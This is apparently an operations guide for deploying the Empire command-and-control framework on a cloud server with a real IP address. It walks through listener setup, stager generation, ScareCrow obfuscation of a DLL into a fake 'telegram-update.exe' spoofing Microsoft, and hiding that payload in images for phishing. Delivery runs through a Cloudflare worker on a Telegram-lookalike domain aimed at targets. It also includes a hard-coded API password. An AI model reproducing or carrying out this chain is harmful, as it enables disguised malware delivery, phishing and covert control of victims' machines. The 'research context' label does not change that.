# Empire C2 Framework - Digital Ocean Deployment Guide

## Current Status

- Empire installed locally (powershell-empire)
- Starkiller configured
- Digital Ocean droplet: `161.35.155.3`
- Domain configured: `161-35-155-3.sslip.io`
- nginx proxy ready on droplet
- SSH access: `ssh -p 22 root@161.35.155.3`
- ⏳ Empire dependencies need to be resolved
- ⏳ Listeners need to be configured
- ⏳ Stagers need to be generated

## Deployment Steps

### Step 1: Fix Empire Installation

The Kali system Empire installation has dependency issues. Best approach:

```bash
# Remove broken installation
sudo apt remove powershell-empire

# Install from source
cd /opt
sudo git clone --recursive https/github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh

# Start Empire server
sudo powershell-empire server
```

### Step 2: Digital Ocean nginx Configuration

SSH into your droplet and configure nginx reverse proxy:

```bash
ssh root@161.35.155.3

# Create nginx config for Empire
cat > /etc/nginx/sites-available/empire << 'EOF'
server {
 listen 443 ssl http2;
 server_name 161-35-155-3.sslip.io;

 ssl_certificate /etc/letsencrypt/live/161-35-155-3.sslip.io/fullchain.pem;
 ssl_certificate_key /etc/letsencrypt/live/161-35-155-3.sslip.io/privkey.pem;

 # Starkiller UI
 location / {
 proxy_pass http/127.0.0.1:3000;
 proxy_http_version 1.1;
 proxy_set_header Upgrade $http_upgrade;
 proxy_set_header Connection 'upgrade';
 proxy_set_header Host $host;
 proxy_cache_bypass $http_upgrade;
 }

 # Empire API
 location /api {
 proxy_pass http/127.0.0.1:1337;
 proxy_http_version 1.1;
 proxy_set_header X-Real-IP $remote_addr;
 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
 proxy_set_header Host $host;
 }

 # WebSocket support
 location /socket.io {
 proxy_pass http/127.0.0.1:1337;
 proxy_http_version 1.1;
 proxy_set_header Upgrade $http_upgrade;
 proxy_set_header Connection "upgrade";
 }
}

# HTTP redirect to HTTPS
server {
 listen 80;
 server_name 161-35-155-3.sslip.io;
 return 301 https/$server_name$request_uri;
}
EOF

# Enable site
ln -s /etc/nginx/sites-available/empire /etc/nginx/sites-enabled/
nginx -t
systemctl reload nginx
```

### Step 3: Setup SSH Tunnel (Development)

For local development before full deployment:

```bash
# Forward Empire API from local machine to droplet
ssh -R 13371337 root@161.35.155.3

# Forward Starkiller from local machine to droplet
ssh -R 30003000 root@161.35.155.3
```

### Step 4: Configure Empire Listeners

Once Empire is running, create listeners:

#### HTTP Listener (Domain Fronting via nginx)
```python
# Via Empire CLI
uselistener http
set Host https/161-35-155-3.sslip.io
set Port 443
set BindIP 127.0.0.1
set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0
execute
```

#### HTTPS Listener (Direct)
```python
uselistener https
set Host https/161-35-155-3.sslip.io
set Port 8443
set CertPath /etc/letsencrypt/live/161-35-155-3.sslip.io/fullchain.pem
execute
```

### Step 5: Generate Stagers

#### Windows PowerShell Stager
```python
# Via Empire CLI
usestager windows/launcher_bat
set Listener http
set OutFile /home/kali/Main\ C2\ Framework/stagers/launcher.bat
execute
```

#### Windows DLL Stager (for ScareCrow)
```python
usestager windows/dll
set Listener http
set OutFile /home/kali/Main\ C2\ Framework/stagers/empire.dll
execute
```

#### Python Stager
```python
usestager multi/launcher
set Listener http
set OutFile /home/kali/Main\ C2\ Framework/stagers/launcher.py
execute
```

### Step 6: Integrate with ScareCrow

```bash
cd /home/kali/ScareCrow

# Generate obfuscated payload with Empire stager
./ScareCrow \\
 -I /home/kali/Main\ C2\ Framework/stagers/empire.dll \\
 -Loader binary \\
 -domain microsoft.com \\
 -O /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe
```

### Step 7: Update Steganography System

Update the steganography delivery system with new payloads:

```bash
cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing

# Embed ScareCrow payload in images
python3 large-stego-system.py embed \\
 --payload /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe \\
 --output-dir ./output
```

### Step 8: Deploy Cloudflare Workers

```bash
# Deploy delivery worker
cd workers
wrangler publish enhanced-telegram-delivery.js

# Test worker
curl -X POST https/delivery.telegrams.app/api/deliver \\
 -H "Content-Type: application/json" \\
 -d '{"target_id": "test_user"}'
```

## Verification Checklist

- [ ] Empire server running on local machine
- [ ] Empire API responding at `http/127.0.0.1:1337`
- [ ] Starkiller UI accessible
- [ ] nginx proxy configured on droplet
- [ ] SSL certificates valid
- [ ] SSH tunnel or direct connection working
- [ ] Listeners created and active
- [ ] Stagers generated successfully
- [ ] Test agent checks in
- [ ] Domain fronting verified
- [ ] Cloudflare workers deployed
- [ ] Steganography system updated
- [ ] End-to-end payload delivery tested

## Troubleshooting

### Empire Won't Start
```bash
# Check dependencies
pip3 install -r /opt/Empire/requirements.txt

# Check logs
tail -f /opt/Empire/empire.log

# Reset database
powershell-empire server --reset
```

### nginx Issues
```bash
# Check config
nginx -t

# View logs
tail -f /var/log/nginx/error.log

# Restart service
systemctl restart nginx
```

### Listener Not Working
- Verify firewall rules: `ufw status`
- Check Empire listener status
- Test direct connection: `curl https/161-35-155-3.sslip.io`
- Verify DNS resolution: `dig 161-35-155-3.sslip.io`

## Next Steps

1. **Testing**: Deploy test stagers in controlled VM
2. **OPSEC**: Configure IP filtering and rate limiting
3. **Monitoring**: Setup logging and alerting
4. **Backup**: Create config backups
5. **Documentation**: Record all configurations

## Quick Commands Reference

```bash
# Start Empire locally
powershell-empire server --config empire-config.yaml

# SSH to droplet
ssh root@161.35.155.3

# Check Empire status
curl http/127.0.0.1:1337/api/v2/meta/version

# List listeners
curl -u empireadmin:EmpireC2Pass2024! \\
 http/127.0.0.1:1337/api/v2/listeners

# List agents
curl -u empireadmin:EmpireC2Pass2024! \\
 http/127.0.0.1:1337/api/v2/agents

# Reload nginx
ssh root@161.35.155.3 "systemctl reload nginx"
```

## Security Considerations

- Change default Empire passwords immediately
- Use SSH keys instead of passwords for droplet access
- Configure fail2ban on droplet
- Implement IP whitelist for C2 panel
- Use VPN for all C2 management
- Regular security audits of infrastructure
- Proper log sanitization

---

**Status**: Ready for deployment once Empire dependencies are resolved
**Last Updated**: $(date)
**Project**: Advanced Steganography C2 Framework
**Research Context**: Criminology - Copenhagen University
